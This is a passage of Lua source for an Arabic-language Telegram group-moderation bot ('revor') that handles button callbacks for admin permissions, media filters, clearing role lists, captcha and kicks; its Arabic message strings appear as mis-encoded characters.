else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=false'..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banuserfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banuserfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=false' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=false' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinkfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinkfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=false' ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end



if Text and Text:match('(.*)/noS') then
sudoo = Text:gsub("/noS","")
print(msg.sender_user_id_,sudoo)
print(msg.sender_user_id_== tonumber(sudoo))
if msg.sender_user_id_ == tonumber(sudoo) then 
--DeleteMessage(msg.chat_id_,{[0] = msg.message_id_})
local Teext = "Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± Ψ¨ΩΨ¬Ψ§Ψ­ ."
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
return false
end
end
if Text and Text:match('(.*)/cancelY') then
local Teext = "Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± Ψ¨ΩΨ¬Ψ§Ψ­ ."
database:del(bot_id..":"..msg.sender_user_id_.."YTsearch"..msg.chat_id_)
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
return false
end
if Text and Text:match('(.*)/yesS') then
sudoo = Text:gsub("/yesS","")
if msg.sender_user_id_ == tonumber(sudoo) then 
local Texxt = "Ω­ Ψ­Ψ³ΩΩΨ§ Ψ§ΩΨ§Ω ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω ΩΨΉΨ±Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§ΩΨ¬Ψ―ΩΨ― ..."
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'Ψ₯Ψ§ΩΩΨΊΩΨ§Ψ‘ Ψ§ΩΨ£ΩΩΨ±', callback_data=msg.sender_user_id_.."/noS"}}}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Texxt).."&message_id="..msg_idd.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:set(bot_id..":usernewsudo:"..msg.sender_user_id_,data.message_id_)
return false
end
end
if Text == 'ghany' then
local notText = 'Ψ§ΩΨͺΨ¨ ΨΊΩΩΩΩ ΩΨ³ΩΩ ΩΨ±Ψ― Ψ§ΩΨ¨ΩΨͺ Ψ¨ Ψ§ΨΊΩΩΩ ΨΉΨ΄ΩΨ§Ψ¦ΩΩ\nΨ§Ω Ψ§ΩΨͺΨ¨ ΨΊΩΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΨ·Ψ±Ψ¨\nΩΨ«Ψ§Ω : ΨΊΩΩΩΩ ΩΩΨ¬Ψ²\n'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'aghany' then
local notText = 'ΩΨ±Ψ€ΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ§ΩΨͺΨ¨ : Ψ§ΨΊΨ§ΩΩ'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'aflam' then
local notText = 'ΩΨ±Ψ€ΩΩ Ψ§ΩΨ§ΩΩΨ§Ω Ψ§ΩΨͺΨ¨ : Ψ§ΩΩΨ§Ω'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'them' then
local notText = 'Ψ§ΩΨͺΨ¨ Ψ«ΩΩ ΩΨΉΨ±ΨΆ Ψ§ΩΨ«ΩΩΨ§Ψͺ'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'tweet' then
local notText = 'Ψ§ΩΨͺΨ¨ ΨͺΩΩΨͺ Ψ¨Ψ§ΩΨ΅ΩΨ±'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'cartoon' then
local notText = 'Ψ§ΩΨͺΨ¨ ΩΨ§Ψ±ΨͺΩΩ ΩΨ±Ψ€ΩΩ Ψ§ΩΩΨ§Ψ±ΨͺΩΩ'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text == 'wife' then 
local notText = 'ΩΨΉΨ¨Ω ΨͺΨͺΨ¬ΩΨ²ΩΩΩ Ψ§ΨΉΩΩ Ψ±ΩΨ¨ΩΨ§Ω ΨΉΩΩ Ψ§Ω ΩΨ³Ψ―Ψ¬ ΩΨ§ΩΨͺΨ¨ ΨͺΨͺΨ¬ΩΨ²ΩΩΩ'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
if Text and Text:match("^animation(.*)$") then  
idch = Text:match("-100(%d+)")
local idchci = "-100"..idch
local animation = Text:match("^animation(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩΨ§ Ψ¨ΩΨ¬Ψ§Ψ­*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."filteranimation"..idchci,animation)  
end
if Text and Text:match("^pito(.*)$") then  
local idchci = database:get(bot_id.."Filter:msg")
local photo = Text:match("^pito(.*)$")
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩΨ§ Ψ¨ΩΨ¬Ψ§Ψ­*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."filterphoto"..idchci,photo)  
end
if Text and Text:match("^Sticker(.*)$") then  
idch = Text:match("-100(%d+)")
local idchci = "-100"..idch
local Sticker = Text:match("^Sticker(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
database:srem(bot_id.."filtersteckr"..idchci,Sticker)  
end
if Text and Text:match("^delallSticker(.*)$") then  
local delallSticker = Text:match("^delallSticker(.*)$")
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listSticker = database:smembers(bot_id.."filtersteckr"..delallSticker)  
for k,v in pairs(listSticker) do  
database:srem(bot_id.."filtersteckr"..delallSticker,v)  
end  
end
if Text and Text:match("^delallanimation(.*)$") then  
local delallmation = Text:match("^delallanimation(.*)$")
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listAnimation = database:smembers(bot_id.."filteranimation"..delallmation)  
for k,v in pairs(listAnimation) do  
database:srem(bot_id.."filteranimation"..delallmation,v)  
end  
end
if Text and Text:match("^delallph(.*)$") then  
local delallph = Text:match("^delallph(.*)$")
local Text ="*Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ ΩΩ Ψ§ΩΨ΅ΩΨ±*"
inline = {
{{text = 'source revor',url='http://t.me/revorb0t'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
local listPhoto = database:smembers(bot_id.."filterphoto"..delallph)  
for k,v in pairs(listPhoto) do  
database:srem(bot_id.."filterphoto"..delallph,v)  
end  
end
if Text == 'delmuteall'..data.sender_user_id_ and DevSonic(mahh) then  
database:del(bot_id.."Gmute:User")
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delbanu'..data.sender_user_id_ and Admin(mahh) then  
database:del(bot_id.."Ban:User"..msg.chat_id_)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'deldev'..data.sender_user_id_ and Devss(mahh) then  
database:del(bot_id.."Sudo:User")
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'deldevsall'..data.sender_user_id_ and DevSonic(mahh) then  
database:del(bot_id.."DEV:Sudo:T")
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delvip'..data.sender_user_id_ and Admin(mahh) then  
database:del(bot_id.."Special:User"..msg.chat_id_)
database:del(bot_id.."Special:User"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delvipall'..data.sender_user_id_ and DevSonic(mahh) then  
database:del(bot_id.."Vip:all")
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delmod'..data.sender_user_id_ and Manger(mahh) then  
database:del(bot_id.."Mod:User"..msg.chat_id_)
database:del(bot_id.."Mod:User"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delmonsh'..data.sender_user_id_ and SupCreator(mahh) then  
database:del(bot_id.."Creator"..msg.chat_id_)
database:del(bot_id.."Creator"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delasas'..data.sender_user_id_ and DevBot(mahh) then  
database:del(bot_id.."Basic:Creator"..msg.chat_id_)
database:del(bot_id.."Basic:Creator"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delowner'..data.sender_user_id_ and DevBot(mahh) then  
database:del(bot_id.."Basic:Creator23"..msg.chat_id_)
database:del(bot_id.."Basic:Creator23"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delmanger'..data.sender_user_id_ and Creator(mahh) then  
database:del(bot_id.."Manager"..msg.chat_id_)
database:del(bot_id.."Manager"..kkh)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
tww = 'Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(tww)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delbanall'..data.sender_user_id_ and DevSonic(mahh) then  
database:del(bot_id.."GBan:User")
database:del(bot_id.."Gmute:User")
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'delmute'..data.sender_user_id_ and DevSonic(mahh) then  
database:del(bot_id.."Muted:User"..msg.chat_id_)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΩΩΨͺΩΩΩΩ*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'EndAddarray'..data.sender_user_id_ then  
if database:get(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id) == 'true1' then
database:del(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ―ΩΨ― Ψ¨ΩΨ¬Ψ§Ψ­*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sα΄α΄Κα΄Κ revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" * Ω­ ΨͺΩ ΨͺΩΩΩΨ° Ψ§ΩΨ§ΩΨ± Ψ³Ψ§Ψ¨ΩΨ§*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text == 'okCaptcha'..data.sender_user_id_ then  
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
return false
end
if Text == 'OkKikedMe'..data.sender_user_id_ then  
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=Chat_id,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if (data and data.code_ and data.code_ == 3) then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" Ω­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΨ¬Ψ±ΩΨ¨")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.ID and data.ID == 'Ok' then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("Ω­ ΨͺΩ Ψ·Ψ±Ψ―Ω Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)   
end
if Text == 'noKikedMe'..data.sender_user_id_ then  
local Text ="Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± "
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'source revor',url='http://t.me/Revorb0t'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == 'OkDelMe'..data.sender_user_id_ then  
local delme = database:get(bot_id..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if database:sismember(bot_id..'Basic:Creator'..msg.chat_id_, msg.sender_user_id_) then
monsh = 'Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ Ψ ' else monsh = '' end 
if database:sismember(bot_id.."Creator"..msg.chat_id_, msg.sender_user_id_) then
cr = "ΩΩΨ΄Ψ¦ Ψ" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
owner = 'Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ ' else owner = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, msg.sender_user_id_) then
momod = 'Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ ' else momod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, msg.sender_user_id_) then
vipmem = 'Ψ§ΩΩΩΩΨ²ΩΩ Ψ ' else vipmem = '' end
if database:sismember(bot_id..'Basic:Creator'..msg.chat_id_, msg.sender_user_id_) or database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) or database:sismember(bot_id..'Mod:User'..msg.chat_id_, msg.sender_user_id_) or database:sismember(bot_id..'Special:User'..msg.chat_id_, msg.sender_user_id_) or database:sismember(bot_id..'Creator'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'Basic:Creator'..msg.chat_id_,msg.sender_user_id_)
database:srem(bot_id.."Creator"..msg.chat_id_, msg.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_)
database:del(bot_id..'yesdel'..msg.sender_user_id_..'', 'delyes') 
